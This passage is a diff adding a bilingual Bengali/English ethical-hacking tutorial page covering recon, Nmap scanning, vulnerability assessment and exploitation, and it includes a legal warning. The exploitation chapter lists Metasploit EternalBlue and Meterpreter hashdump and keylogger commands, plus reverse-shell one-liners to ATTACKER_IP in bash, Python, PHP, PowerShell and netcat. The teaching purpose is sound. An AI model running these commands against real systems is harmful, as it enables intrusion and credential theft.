+        <p style="font-size:13px;"><span class="bn-text">কখনো অনুমতি ছাড়া, কিন্তু ক্ষতির উদ্দেশ্য নেই। আইনগতভাবে ঝুঁকিপূর্ণ।</span><span class="en-text">Sometimes without permission, but no malicious intent. Legally risky.</span></p>
+      </div>
+      <div class="card red-card">
+        <h4>🔴 Black Hat</h4>
+        <p style="font-size:13px;"><span class="bn-text">অনুমতি ছাড়া সিস্টেম ভাঙে। Criminal। Illegal।</span><span class="en-text">Breaks into systems without permission. Criminal. Illegal.</span></p>
+      </div>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Penetration Testing Methodology</span><span class="en-text">Penetration Testing Methodology</span></h2>
+    <div class="attack-chain">
+      <div class="chain-step" style="background:rgba(0,255,136,0.1);color:var(--accent);border:1px solid rgba(0,255,136,0.3);border-radius:6px;">
+        <div style="font-size:20px;margin-bottom:4px;">🕵️</div>
+        <span class="bn-text">Reconnaissance</span><span class="en-text">Reconnaissance</span>
+      </div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-step" style="background:rgba(0,200,255,0.1);color:var(--accent2);border:1px solid rgba(0,200,255,0.3);border-radius:6px;">
+        <div style="font-size:20px;margin-bottom:4px;">🔍</div>
+        <span class="bn-text">Scanning</span><span class="en-text">Scanning</span>
+      </div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-step" style="background:rgba(168,85,247,0.1);color:var(--accent5);border:1px solid rgba(168,85,247,0.3);border-radius:6px;">
+        <div style="font-size:20px;margin-bottom:4px;">🎯</div>
+        <span class="bn-text">Gaining Access</span><span class="en-text">Gaining Access</span>
+      </div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-step" style="background:rgba(255,71,87,0.1);color:var(--accent3);border:1px solid rgba(255,71,87,0.3);border-radius:6px;">
+        <div style="font-size:20px;margin-bottom:4px;">⬆️</div>
+        <span class="bn-text">Maintaining Access</span><span class="en-text">Maintaining Access</span>
+      </div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-step" style="background:rgba(255,165,2,0.1);color:var(--accent4);border:1px solid rgba(255,165,2,0.3);border-radius:6px;">
+        <div style="font-size:20px;margin-bottom:4px;">🧹</div>
+        <span class="bn-text">Clearing Tracks</span><span class="en-text">Clearing Tracks</span>
+      </div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-step" style="background:rgba(0,255,136,0.1);color:var(--accent);border:1px solid rgba(0,255,136,0.3);border-radius:6px;">
+        <div style="font-size:20px;margin-bottom:4px;">📝</div>
+        <span class="bn-text">Reporting</span><span class="en-text">Reporting</span>
+      </div>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">সম্পূর্ণ Learning Roadmap</span><span class="en-text">Complete Learning Roadmap</span></h2>
+
+    <div class="roadmap-phase">
+      <div class="phase-num" style="background:rgba(0,255,136,0.15);color:var(--accent);border:2px solid rgba(0,255,136,0.4);">1</div>
+      <div class="phase-content">
+        <div class="phase-title" style="color:var(--accent);"><span class="bn-text">🌱 ফাউন্ডেশন (১-৩ মাস)</span><span class="en-text">🌱 Foundation (1-3 Months)</span></div>
+        <div class="phase-desc"><span class="bn-text">শুরু করার আগে যা জানতে হবে</span><span class="en-text">What you need to know before starting</span></div>
+        <div class="phase-items">
+          <span class="phase-item p-green">Linux Basics</span>
+          <span class="phase-item p-green">Networking (TCP/IP)</span>
+          <span class="phase-item p-green">Python Scripting</span>
+          <span class="phase-item p-green">Web Basics (HTTP)</span>
+          <span class="phase-item p-green">Virtualization (VMware/VBox)</span>
+        </div>
+      </div>
+    </div>
+    <div class="roadmap-connector">↓</div>
+
+    <div class="roadmap-phase">
+      <div class="phase-num" style="background:rgba(0,200,255,0.15);color:var(--accent2);border:2px solid rgba(0,200,255,0.4);">2</div>
+      <div class="phase-content">
+        <div class="phase-title" style="color:var(--accent2);"><span class="bn-text">🔍 Reconnaissance & Scanning (২-৩ মাস)</span><span class="en-text">🔍 Reconnaissance & Scanning (2-3 Months)</span></div>
+        <div class="phase-desc"><span class="bn-text">Target সম্পর্কে তথ্য সংগ্রহ করার কৌশল</span><span class="en-text">Techniques for gathering information about a target</span></div>
+        <div class="phase-items">
+          <span class="phase-item p-blue">Nmap</span>
+          <span class="phase-item p-blue">OSINT (Maltego)</span>
+          <span class="phase-item p-blue">Google Dorks</span>
+          <span class="phase-item p-blue">Shodan</span>
+          <span class="phase-item p-blue">theHarvester</span>
+          <span class="phase-item p-blue">Nikto</span>
+        </div>
+      </div>
+    </div>
+    <div class="roadmap-connector">↓</div>
+
+    <div class="roadmap-phase">
+      <div class="phase-num" style="background:rgba(255,71,87,0.15);color:var(--accent3);border:2px solid rgba(255,71,87,0.4);">3</div>
+      <div class="phase-content">
+        <div class="phase-title" style="color:var(--accent3);"><span class="bn-text">💥 Exploitation (৩-৪ মাস)</span><span class="en-text">💥 Exploitation (3-4 Months)</span></div>
+        <div class="phase-desc"><span class="bn-text">দুর্বলতা খুঁজে কাজে লাগানো</span><span class="en-text">Finding and exploiting vulnerabilities</span></div>
+        <div class="phase-items">
+          <span class="phase-item p-red">Metasploit</span>
+          <span class="phase-item p-red">Burp Suite</span>
+          <span class="phase-item p-red">SQLi / XSS</span>
+          <span class="phase-item p-red">Buffer Overflow</span>
+          <span class="phase-item p-red">CVE Research</span>
+        </div>
+      </div>
+    </div>
+    <div class="roadmap-connector">↓</div>
+
+    <div class="roadmap-phase">
+      <div class="phase-num" style="background:rgba(168,85,247,0.15);color:var(--accent5);border:2px solid rgba(168,85,247,0.4);">4</div>
+      <div class="phase-content">
+        <div class="phase-title" style="color:var(--accent5);"><span class="bn-text">⬆️ Post-Exploitation & PrivEsc (২-৩ মাস)</span><span class="en-text">⬆️ Post-Exploitation & PrivEsc (2-3 Months)</span></div>
+        <div class="phase-desc"><span class="bn-text">System-এ ঢোকার পর কী করতে হয়</span><span class="en-text">What to do after getting into a system</span></div>
+        <div class="phase-items">
+          <span class="phase-item p-purple">LinPEAS/WinPEAS</span>
+          <span class="phase-item p-purple">Mimikatz</span>
+          <span class="phase-item p-purple">BloodHound</span>
+          <span class="phase-item p-purple">Persistence</span>
+          <span class="phase-item p-purple">Pivoting</span>
+        </div>
+      </div>
+    </div>
+    <div class="roadmap-connector">↓</div>
+
+    <div class="roadmap-phase">
+      <div class="phase-num" style="background:rgba(255,165,2,0.15);color:var(--accent4);border:2px solid rgba(255,165,2,0.4);">5</div>
+      <div class="phase-content">
+        <div class="phase-title" style="color:var(--accent4);"><span class="bn-text">🏆 Certification & CTF (চলমান)</span><span class="en-text">🏆 Certification & CTF (Ongoing)</span></div>
+        <div class="phase-desc"><span class="bn-text">Career প্রমাণের জন্য সার্টিফিকেশন</span><span class="en-text">Certifications to prove your career skills</span></div>
+        <div class="phase-items">
+          <span class="phase-item p-yellow">CEH</span>
+          <span class="phase-item p-yellow">OSCP</span>
+          <span class="phase-item p-yellow">eJPT</span>
+          <span class="phase-item p-yellow">TryHackMe</span>
+          <span class="phase-item p-yellow">HackTheBox</span>
+          <span class="phase-item p-yellow">Bug Bounty</span>
+        </div>
+      </div>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Career Path — কোথায় যাবে?</span><span class="en-text">Career Path — Where Can You Go?</span></h2>
+    <table>
+      <thead><tr>
+        <th><span class="bn-text">ভূমিকা</span><span class="en-text">Role</span></th>
+        <th><span class="bn-text">কাজ</span><span class="en-text">Work</span></th>
+        <th><span class="bn-text">গড় বেতন (USD)</span><span class="en-text">Avg Salary (USD)</span></th>
+        <th><span class="bn-text">দরকারি সার্টিফিকেট</span><span class="en-text">Required Certs</span></th>
+      </tr></thead>
+      <tbody>
+        <tr><td><strong>Penetration Tester</strong></td><td><span class="bn-text">সিস্টেম ভেঙে রিপোর্ট করা</span><span class="en-text">Break systems & report</span></td><td>$80K–$130K</td><td>OSCP, CEH</td></tr>
+        <tr><td><strong>Bug Bounty Hunter</strong></td><td><span class="bn-text">কোম্পানির bug খুঁজে পুরস্কার নেওয়া</span><span class="en-text">Find bugs, get rewards</span></td><td>$20K–$200K+</td><td>কোনোটাই না</td></tr>
+        <tr><td><strong>Red Team Operator</strong></td><td><span class="bn-text">Real attacker simulate করা</span><span class="en-text">Simulate real attackers</span></td><td>$100K–$160K</td><td>OSCP, CRTO</td></tr>
+        <tr><td><strong>Security Researcher</strong></td><td><span class="bn-text">নতুন vulnerability গবেষণা</span><span class="en-text">Research new vulnerabilities</span></td><td>$90K–$150K</td><td>CVE Publication</td></tr>
+        <tr><td><strong>SOC Analyst</strong></td><td><span class="bn-text">আক্রমণ detect ও respond করা</span><span class="en-text">Detect & respond to attacks</span></td><td>$55K–$90K</td><td>CompTIA Security+</td></tr>
+      </tbody>
+    </table>
+
+    <div class="box info">
+      <div class="box-t">⚖️ <span class="bn-text">আইনগত সতর্কতা</span><span class="en-text">Legal Warning</span></div>
+      <p><span class="bn-text">সবসময় <strong>written permission</strong> নিয়ে কাজ করো। বাংলাদেশে Digital Security Act এবং আন্তর্জাতিকভাবে Computer Fraud and Abuse Act (CFAA) অনুযায়ী অননুমোদিত হ্যাকিং ফৌজদারি অপরাধ। HackTheBox, TryHackMe বা নিজের lab-এ practice করো।</span><span class="en-text">Always work with <strong>written permission</strong>. Unauthorized hacking is a criminal offense under Bangladesh's Digital Security Act and internationally under the Computer Fraud and Abuse Act (CFAA). Practice on HackTheBox, TryHackMe, or your own lab.</span></p>
+    </div>
+
+    <div class="ch-summary">
+      <h3>// <span class="bn-text">মূল কথা</span><span class="en-text">Key Takeaways</span> //</h3>
+      <ul>
+        <li>🟢 <span class="bn-text">Ethical Hacking = অনুমতি + দক্ষতা + দায়িত্ব</span><span class="en-text">Ethical Hacking = Permission + Skill + Responsibility</span></li>
+        <li>🔵 <span class="bn-text">Foundation ছাড়া hacking শেখা সম্ভব না — Linux, Networking, Python আগে শেখো</span><span class="en-text">Cannot learn hacking without a foundation — learn Linux, Networking, Python first</span></li>
+        <li>🔴 <span class="bn-text">সবসময় legal environment-এ practice করো</span><span class="en-text">Always practice in a legal environment</span></li>
+        <li>🟡 <span class="bn-text">Roadmap অনুসরণ করো — shortcuts নেই</span><span class="en-text">Follow the roadmap — there are no shortcuts</span></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     CHAPTER 2: RECONNAISSANCE
+══════════════════════════════════════ -->
+<div class="chapter ch2">
+  <div class="chapter-header" data-num="02">
+    <div class="chapter-label">CHAPTER 02</div>
+    <div class="chapter-title">🕵️ <span class="bn-text">Reconnaissance — তথ্য সংগ্রহ</span><span class="en-text">Reconnaissance — Information Gathering</span></div>
+    <div class="chapter-desc"><span class="bn-text">Target সম্পর্কে সর্বোচ্চ তথ্য সংগ্রহ করাই প্রথম এবং সবচেয়ে গুরুত্বপূর্ণ ধাপ</span><span class="en-text">Gathering maximum information about the target is the first and most important step</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">Passive vs Active Reconnaissance</span><span class="en-text">Passive vs Active Reconnaissance</span></h2>
+    <div class="grid2">
+      <div class="card">
+        <h4>🔇 <span class="bn-text">Passive Recon</span><span class="en-text">Passive Recon</span></h4>
+        <p style="font-size:13px;"><span class="bn-text">Target-এর সাথে সরাসরি যোগাযোগ ছাড়া তথ্য সংগ্রহ। সম্পূর্ণ stealth — target টের পায় না।</span><span class="en-text">Gathering information without direct contact with the target. Completely stealth — target won't notice.</span></p>
+        <ul style="font-size:12.5px;">
+          <li>WHOIS lookup</li>
+          <li>Google Dorks</li>
+          <li>LinkedIn/Social Media</li>
+          <li>Shodan / Censys</li>
+          <li>DNS Records</li>
+          <li>Job Postings (tech stack)</li>
+        </ul>
+      </div>
+      <div class="card red-card">
+        <h4>📡 <span class="bn-text">Active Recon</span><span class="en-text">Active Recon</span></h4>
+        <p style="font-size:13px;"><span class="bn-text">সরাসরি target-এর সাথে interact করে তথ্য সংগ্রহ। Log-এ trace থাকতে পারে।</span><span class="en-text">Information gathering by directly interacting with the target. May leave traces in logs.</span></p>
+        <ul style="font-size:12.5px;">
+          <li>Nmap port scanning</li>
+          <li>Banner grabbing</li>
+          <li>Ping sweep</li>
+          <li>DNS zone transfer</li>
+          <li>Web crawling</li>
+          <li>Traceroute</li>
+        </ul>
+      </div>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">OSINT — Open Source Intelligence</span><span class="en-text">OSINT — Open Source Intelligence</span></h2>
+    <p><span class="bn-text">OSINT হলো publicly available তথ্য ব্যবহার করে target সম্পর্কে intelligence তৈরি করা। Professional pentester-রা ৬০-৭০% সময় recon-এ ব্যয় করে।</span><span class="en-text">OSINT is using publicly available information to create intelligence about a target. Professional pentesters spend 60-70% of their time on recon.</span></p>
+
+    <h3 class="sub"><span class="bn-text">Google Dorks — সার্চ ইঞ্জিন হ্যাকিং</span><span class="en-text">Google Dorks — Search Engine Hacking</span></h3>
+    <div class="code">
+<span class="c"># Google Dork Examples</span>
+site:target.com filetype:pdf
+site:target.com inurl:admin
+site:target.com intitle:"index of"
+inurl:target.com ext:sql | ext:db | ext:log
+"@target.com" filetype:xls
+site:target.com intext:"password" OR intext:"passwd"
+intitle:"Apache Status" inurl:server-status site:target.com
+cache:target.com
+<span class="c"># Subdomain enumeration via Google</span>
+site:*.target.com -www
+    </div>
+
+    <h3 class="sub"><span class="bn-text">WHOIS ও DNS Enumeration</span><span class="en-text">WHOIS & DNS Enumeration</span></h3>
+    <div class="code">
+<span class="c"># WHOIS lookup</span>
+<span class="p">$</span> whois target.com
+<span class="p">$</span> whois 192.168.1.1
+
+<span class="c"># DNS Enumeration</span>
+<span class="p">$</span> nslookup target.com
+<span class="p">$</span> dig target.com ANY
+<span class="p">$</span> dig target.com MX
+<span class="p">$</span> dig target.com NS
+<span class="p">$</span> host -t ns target.com
+
+<span class="c"># DNS Zone Transfer (misconfiguration exploit)</span>
+<span class="p">$</span> dig axfr @ns1.target.com target.com
+<span class="p">$</span> dnsrecon -d target.com -t axfr
+
+<span class="c"># Subdomain Enumeration</span>
+<span class="p">$</span> sublist3r -d target.com
+<span class="p">$</span> amass enum -d target.com
+<span class="p">$</span> dnsx -d target.com -w /usr/share/wordlists/dns.txt
+    </div>
+
+    <h3 class="sub"><span class="bn-text">Shodan — Internet-এর Search Engine</span><span class="en-text">Shodan — Search Engine of the Internet</span></h3>
+    <div class="code">
+<span class="c"># Shodan CLI</span>
+<span class="p">$</span> shodan init YOUR_API_KEY
+<span class="p">$</span> shodan host 192.168.1.1
+<span class="p">$</span> shodan search "apache 2.4" country:BD
+<span class="p">$</span> shodan search "port:22" org:"target company"
+
+<span class="c"># Shodan Dorks (web interface)</span>
+hostname:target.com
+org:"Target Organization"
+net:192.168.0.0/24
+port:3306 country:BD     <span class="c"># MySQL servers</span>
+"default password" port:80
+vuln:CVE-2021-44228       <span class="c"># Log4Shell vulnerable</span>
+    </div>
+
+    <h3 class="sub"><span class="bn-text">Email Harvesting</span><span class="en-text">Email Harvesting</span></h3>
+    <div class="code">
+<span class="p">$</span> theHarvester -d target.com -b google,bing,linkedin
+<span class="p">$</span> theHarvester -d target.com -b all -l 500 -f output.html
+<span class="p">$</span> hunter.io  <span class="c"># Web-based email finder</span>
+<span class="p">$</span> emailhippo <span class="c"># Email validation</span>
+    </div>
+
+    <div class="ch-summary">
+      <h3>// <span class="bn-text">Recon চেকলিস্ট</span><span class="en-text">Recon Checklist</span> //</h3>
+      <ul>
+        <li>✅ <span class="bn-text">WHOIS ও DNS records সংগ্রহ করো</span><span class="en-text">Gather WHOIS and DNS records</span></li>
+        <li>✅ <span class="bn-text">Subdomain enumerate করো</span><span class="en-text">Enumerate subdomains</span></li>
+        <li>✅ <span class="bn-text">Email address ও কর্মীদের তালিকা তৈরি করো</span><span class="en-text">Build a list of email addresses and employees</span></li>
+        <li>✅ <span class="bn-text">Shodan দিয়ে exposed service খোঁজো</span><span class="en-text">Find exposed services using Shodan</span></li>
+        <li>✅ <span class="bn-text">Google Dorks দিয়ে sensitive file খোঁজো</span><span class="en-text">Find sensitive files using Google Dorks</span></li>
+        <li>✅ <span class="bn-text">Social media থেকে tech stack বের করো</span><span class="en-text">Extract tech stack from social media</span></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     CHAPTER 3: SCANNING & ENUMERATION
+══════════════════════════════════════ -->
+<div class="chapter ch3">
+  <div class="chapter-header" data-num="03">
+    <div class="chapter-label">CHAPTER 03</div>
+    <div class="chapter-title">🔍 <span class="bn-text">Scanning & Enumeration</span><span class="en-text">Scanning & Enumeration</span></div>
+    <div class="chapter-desc"><span class="bn-text">Open port, running service, OS version — সব কিছু detect করার কৌশল</span><span class="en-text">Detecting open ports, running services, OS version — techniques for everything</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">Nmap — সবচেয়ে গুরুত্বপূর্ণ Scanning Tool</span><span class="en-text">Nmap — The Most Important Scanning Tool</span></h2>
+    <div class="code">
+<span class="c"># Basic Scans</span>
+<span class="p">$</span> nmap 192.168.1.1                    <span class="c"># Basic scan</span>
+<span class="p">$</span> nmap 192.168.1.0/24                 <span class="c"># Network range</span>
+<span class="p">$</span> nmap -p 80,443,22,21 192.168.1.1   <span class="c"># Specific ports</span>
+<span class="p">$</span> nmap -p- 192.168.1.1               <span class="c"># All 65535 ports</span>
+<span class="p">$</span> nmap -p 1-1000 192.168.1.1         <span class="c"># Port range</span>
+
+<span class="c"># Scan Types</span>
+<span class="p">$</span> nmap -sS 192.168.1.1   <span class="c"># SYN (Stealth) scan</span>
+<span class="p">$</span> nmap -sT 192.168.1.1   <span class="c"># TCP Connect scan</span>
+<span class="p">$</span> nmap -sU 192.168.1.1   <span class="c"># UDP scan</span>
+<span class="p">$</span> nmap -sA 192.168.1.1   <span class="c"># ACK scan (firewall detection)</span>
+
+<span class="c"># Service & OS Detection</span>
+<span class="p">$</span> nmap -sV 192.168.1.1              <span class="c"># Service version</span>
+<span class="p">$</span> nmap -O 192.168.1.1               <span class="c"># OS detection</span>
+<span class="p">$</span> nmap -A 192.168.1.1               <span class="c"># Aggressive (OS+Version+Scripts)</span>
+<span class="p">$</span> nmap -sV --version-intensity 9    <span class="c"># Max version detection</span>
+
+<span class="c"># NSE Scripts</span>
+<span class="p">$</span> nmap --script vuln 192.168.1.1            <span class="c"># Vulnerability scan</span>
+<span class="p">$</span> nmap --script smb-vuln-* 192.168.1.1     <span class="c"># SMB vulnerabilities</span>
+<span class="p">$</span> nmap --script http-enum 192.168.1.1      <span class="c"># Web enumeration</span>
+<span class="p">$</span> nmap --script ftp-anon 192.168.1.1       <span class="c"># Anonymous FTP</span>
+<span class="p">$</span> nmap --script ssh-brute 192.168.1.1      <span class="c"># SSH brute force</span>
+
+<span class="c"># Evasion Techniques</span>
+<span class="p">$</span> nmap -D RND:10 192.168.1.1   <span class="c"># Decoy scan</span>
+<span class="p">$</span> nmap -f 192.168.1.1          <span class="c"># Fragment packets</span>
+<span class="p">$</span> nmap --source-port 53        <span class="c"># Spoof source port</span>
+<span class="p">$</span> nmap -T0 192.168.1.1         <span class="c"># Paranoid (very slow)</span>
+
+<span class="c"># Output Formats</span>
+<span class="p">$</span> nmap -oN output.txt          <span class="c"># Normal text</span>
+<span class="p">$</span> nmap -oX output.xml          <span class="c"># XML format</span>
+<span class="p">$</span> nmap -oG output.gnmap        <span class="c"># Grepable</span>
+<span class="p">$</span> nmap -oA output              <span class="c"># All formats</span>
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Service-Specific Enumeration</span><span class="en-text">Service-Specific Enumeration</span></h2>
+    <h3 class="sub">SMB Enumeration (Port 445)</h3>
+    <div class="code">
+<span class="p">$</span> enum4linux -a 192.168.1.1
+<span class="p">$</span> smbclient -L //192.168.1.1 -N
+<span class="p">$</span> smbmap -H 192.168.1.1
+<span class="p">$</span> crackmapexec smb 192.168.1.1
+<span class="p">$</span> nmap --script smb-enum-users 192.168.1.1
+    </div>
+
+    <h3 class="sub">Web Enumeration (Port 80/443)</h3>
+    <div class="code">
+<span class="c"># Directory Bruteforce</span>
+<span class="p">$</span> gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
+<span class="p">$</span> ffuf -w wordlist.txt -u http://target.com/FUZZ
+<span class="p">$</span> dirb http://target.com
+
+<span class="c"># Web Scanner</span>
+<span class="p">$</span> nikto -h http://target.com
+<span class="p">$</span> whatweb http://target.com
+<span class="p">$</span> wafw00f http://target.com    <span class="c"># WAF detection</span>
+    </div>
+
+    <h3 class="sub">FTP / SSH / SNMP Enumeration</h3>
+    <div class="code">
+<span class="c"># FTP (Port 21) — Anonymous Login Check</span>
+<span class="p">$</span> nmap --script ftp-anon,ftp-bounce -p 21 192.168.1.1
+
+<span class="c"># SSH (Port 22)</span>
+<span class="p">$</span> ssh-audit 192.168.1.1    <span class="c"># Algorithm & version check</span>
+
+<span class="c"># SNMP (Port 161) — Community string</span>
+<span class="p">$</span> snmpwalk -c public -v1 192.168.1.1
+<span class="p">$</span> onesixtyone -c community.txt 192.168.1.1
+    </div>
+
+    <div class="box warn">
+      <div class="box-t">⚡ <span class="bn-text">গুরুত্বপূর্ণ Port নম্বর</span><span class="en-text">Important Port Numbers</span></div>
+      <div class="grid2" style="margin:8px 0 0;">
+        <div style="font-size:12.5px;font-family:'Share Tech Mono',monospace;">
+          21 → FTP &nbsp;&nbsp; 22 → SSH &nbsp;&nbsp; 23 → Telnet<br>
+          25 → SMTP &nbsp; 53 → DNS &nbsp;&nbsp; 80 → HTTP<br>
+          110 → POP3 &nbsp; 143 → IMAP &nbsp; 443 → HTTPS
+        </div>
+        <div style="font-size:12.5px;font-family:'Share Tech Mono',monospace;">
+          445 → SMB &nbsp;&nbsp; 3306 → MySQL &nbsp; 3389 → RDP<br>
+          5432 → PostgreSQL &nbsp; 6379 → Redis<br>
+          8080 → HTTP-Alt &nbsp; 27017 → MongoDB
+        </div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     CHAPTER 4: VULNERABILITY ASSESSMENT
+══════════════════════════════════════ -->
+<div class="chapter ch4">
+  <div class="chapter-header" data-num="04">
+    <div class="chapter-label">CHAPTER 04</div>
+    <div class="chapter-title">🎯 <span class="bn-text">Vulnerability Assessment</span><span class="en-text">Vulnerability Assessment</span></div>
+    <div class="chapter-desc"><span class="bn-text">CVE, CVSS Score, Automated ও Manual vulnerability analysis</span><span class="en-text">CVE, CVSS Score, Automated and Manual vulnerability analysis</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">CVE ও CVSS Score বোঝা</span><span class="en-text">Understanding CVE & CVSS Score</span></h2>
+    <p><span class="bn-text"><strong>CVE (Common Vulnerabilities and Exposures)</strong> হলো publicly disclosed vulnerability-র unique identifier। প্রতিটা CVE-র একটা CVSS Score থাকে যা ০ থেকে ১০-এর মধ্যে।</span><span class="en-text"><strong>CVE (Common Vulnerabilities and Exposures)</strong> is a unique identifier for publicly disclosed vulnerabilities. Each CVE has a CVSS Score between 0 and 10.</span></p>
+
+    <table>
+      <thead><tr>
+        <th>CVSS Score</th>
+        <th><span class="bn-text">গুরুত্ব</span><span class="en-text">Severity</span></th>
+        <th><span class="bn-text">অর্থ</span><span class="en-text">Meaning</span></th>
+      </tr></thead>
+      <tbody>
+        <tr><td><strong>9.0 – 10.0</strong></td><td><span class="badge badge-r">CRITICAL</span></td><td><span class="bn-text">তাৎক্ষণিক প্যাচ দরকার</span><span class="en-text">Immediate patch required</span></td></tr>
+        <tr><td><strong>7.0 – 8.9</strong></td><td><span class="badge badge-r">HIGH</span></td><td><span class="bn-text">শীঘ্রই ঠিক করতে হবে</span><span class="en-text">Fix soon</span></td></tr>
+        <tr><td><strong>4.0 – 6.9</strong></td><td><span class="badge badge-y">MEDIUM</span></td><td><span class="bn-text">পরিকল্পনা করে ঠিক করো</span><span class="en-text">Fix with planning</span></td></tr>
+        <tr><td><strong>0.1 – 3.9</strong></td><td><span class="badge badge-g">LOW</span></td><td><span class="bn-text">কম গুরুত্বপূর্ণ</span><span class="en-text">Less urgent</span></td></tr>
+      </tbody>
+    </table>
+
+    <h2 class="sec"><span class="bn-text">Automated Vulnerability Scanners</span><span class="en-text">Automated Vulnerability Scanners</span></h2>
+    <div class="code">
+<span class="c"># OpenVAS (Free)</span>
+<span class="p">$</span> sudo gvm-start
+<span class="c"># Web UI: https://localhost:9392</span>
+
+<span class="c"># Nessus Essentials (Free for 16 IPs)</span>
+<span class="c"># Web UI: https://localhost:8834</span>
+
+<span class="c"># Nuclei (Fast, template-based)</span>
+<span class="p">$</span> nuclei -u https://target.com
+<span class="p">$</span> nuclei -u https://target.com -t cves/
+<span class="p">$</span> nuclei -l urls.txt -t vulnerabilities/
+<span class="p">$</span> nuclei -u target.com -severity critical,high
+
+<span class="c"># searchsploit — Exploit Database</span>
+<span class="p">$</span> searchsploit apache 2.4
+<span class="p">$</span> searchsploit -m 44228    <span class="c"># Copy exploit to current dir</span>
+<span class="p">$</span> searchsploit --cve 2021-44228
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Manual Vulnerability Research</span><span class="en-text">Manual Vulnerability Research</span></h2>
+    <div class="grid2">
+      <div class="card">
+        <h4>🔍 <span class="bn-text">তথ্যের উৎস</span><span class="en-text">Information Sources</span></h4>
+        <ul style="font-size:12.5px;">
+          <li><strong>NVD</strong> — nvd.nist.gov</li>
+          <li><strong>Exploit-DB</strong> — exploit-db.com</li>
+          <li><strong>CVE Details</strong> — cvedetails.com</li>
+          <li><strong>Packet Storm</strong> — packetstormsecurity.com</li>
+          <li><strong>GitHub</strong> — PoC exploits</li>
+          <li><strong>VulnHub</strong> — Vulnerable VMs</li>
+        </ul>
+      </div>
+      <div class="card green-card">
+        <h4>✅ <span class="bn-text">Manual Analysis Steps</span><span class="en-text">Manual Analysis Steps</span></h4>
+        <ul style="font-size:12.5px;">
+          <li><span class="bn-text">Service ও version note করো</span><span class="en-text">Note service and version</span></li>
+          <li><span class="bn-text">searchsploit দিয়ে exploit খোঁজো</span><span class="en-text">Search exploits with searchsploit</span></li>
+          <li><span class="bn-text">CVE database দেখো</span><span class="en-text">Check the CVE database</span></li>
+          <li><span class="bn-text">Exploit পড়ো ও বোঝো</span><span class="en-text">Read and understand the exploit</span></li>
+          <li><span class="bn-text">Lab-এ test করো আগে</span><span class="en-text">Test in lab first</span></li>
+          <li><span class="bn-text">Scope বাইরে যেও না</span><span class="en-text">Don't go out of scope</span></li>
+        </ul>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- ══════════════════════════════════════
+     CHAPTER 5: EXPLOITATION
+══════════════════════════════════════ -->
+<div class="chapter ch5">
+  <div class="chapter-header" data-num="05">
+    <div class="chapter-label">CHAPTER 05</div>
+    <div class="chapter-title">💥 <span class="bn-text">Exploitation — দুর্বলতা কাজে লাগানো</span><span class="en-text">Exploitation — Taking Advantage of Vulnerabilities</span></div>
+    <div class="chapter-desc"><span class="bn-text">Metasploit Framework, Manual Exploit এবং Reverse Shell</span><span class="en-text">Metasploit Framework, Manual Exploit, and Reverse Shell</span></div>
+  </div>
+  <div class="chapter-body">
+
+    <h2 class="sec"><span class="bn-text">Metasploit Framework</span><span class="en-text">Metasploit Framework</span></h2>
+    <div class="code">
+<span class="c"># Start Metasploit</span>
+<span class="p">$</span> msfconsole
+<span class="p">msf6 ></span> help
+
+<span class="c"># Search & Use Module</span>
+<span class="p">msf6 ></span> search eternalblue
+<span class="p">msf6 ></span> use exploit/windows/smb/ms17_010_eternalblue
+<span class="p">msf6 ></span> info
+<span class="p">msf6 ></span> show options
+<span class="p">msf6 ></span> set RHOSTS 192.168.1.1
+<span class="p">msf6 ></span> set LHOST 192.168.1.100
+<span class="p">msf6 ></span> set LPORT 4444
+<span class="p">msf6 ></span> set payload windows/x64/meterpreter/reverse_tcp
+<span class="p">msf6 ></span> run
+
+<span class="c"># Meterpreter Commands</span>
+<span class="p">meterpreter ></span> sysinfo
+<span class="p">meterpreter ></span> getuid
+<span class="p">meterpreter ></span> getsystem     <span class="c"># Privilege Escalation</span>
+<span class="p">meterpreter ></span> hashdump      <span class="c"># Password hashes</span>
+<span class="p">meterpreter ></span> shell
+<span class="p">meterpreter ></span> upload /path/to/file C:\\Windows\\Temp\\
+<span class="p">meterpreter ></span> download C:\\file.txt /local/path/
+<span class="p">meterpreter ></span> screenshot
+<span class="p">meterpreter ></span> keyscan_start  <span class="c"># Keylogger</span>
+<span class="p">meterpreter ></span> run post/multi/recon/local_exploit_suggester
+    </div>
+
+    <h2 class="sec"><span class="bn-text">Reverse Shell</span><span class="en-text">Reverse Shell</span></h2>
+    <div class="code">
+<span class="c"># Listener setup (attacker machine)</span>
+<span class="p">$</span> nc -lvnp 4444
+<span class="p">$</span> rlwrap nc -lvnp 4444   <span class="c"># With readline support</span>
+
+<span class="c"># Bash Reverse Shell</span>
+bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+
+<span class="c"># Python Reverse Shell</span>
+python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+<span class="c"># PHP Reverse Shell</span>
+php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+<span class="c"># PowerShell Reverse Shell (Windows)</span>
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);..."
+
+<span class="c"># Netcat Reverse Shell</span>
+nc -e /bin/sh ATTACKER_IP 4444
+
+<span class="c"># Upgrade to fully interactive shell</span>
